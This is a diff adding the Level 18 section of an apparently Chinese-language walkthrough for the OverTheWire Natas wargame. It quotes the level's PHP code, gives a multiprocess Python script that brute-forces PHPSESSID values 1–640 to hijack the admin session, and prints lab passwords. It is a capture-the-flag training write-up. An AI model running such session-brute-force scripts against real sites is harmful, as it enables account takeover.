@@ -561,3 +561,70 @@ with Pool(64) as pool:
 ```text
 xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 ```
+
+###Level18
+PHP源码，只贴核心部分
+```php
+$maxid = 640; // 640 should be enough for everyone 
+
+function my_session_start() {
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
+    if(!session_start()) { 
+        return false; 
+    } else { 
+        return true; 
+    } 
+    } 
+    return false; 
+} 
+
+function print_credentials() {
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
+    print "You are an admin. The credentials for the next level are:<br>"; 
+    print "<pre>Username: natas19\n"; 
+    print "Password: <censored></pre>"; 
+    } else { 
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
+    } 
+} 
+
+if(my_session_start()) { 
+    print_credentials(); 
+}
+```
+大概就是读了下cookie里的PHPSESSID，然后就当你是这个session对应的用户了，猜测这640个id里肯定有一个是admin的，于是直接穷举吧…
+```python
+import urllib.request
+import urllib.parse
+from multiprocessing import Pool
+
+url = "http://natas18.natas.labs.overthewire.org/index.php"
+headers = {
+    "Authorization": (
+        "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="
+    ),
+    "Host": "natas18.natas.labs.overthewire.org",
+}
+
+
+def check_password(session_id):
+    post_dict = {
+        "username": "admin",
+        "password": "admin"
+    }
+    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
+    req = urllib.request.Request(url, post_data, headers)
+    req.add_header("Cookie", "PHPSESSID=%d" % session_id)
+    with urllib.request.urlopen(req) as f:
+        body = f.read().decode('utf-8')
+        if body.find("You are an admin.") >= 0:
+            print(session_id)
+
+
+with Pool(64) as pool:
+    pool.map(check_password, range(1, 641))
+```
+最后拿到natas19的密码
+```text
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+```
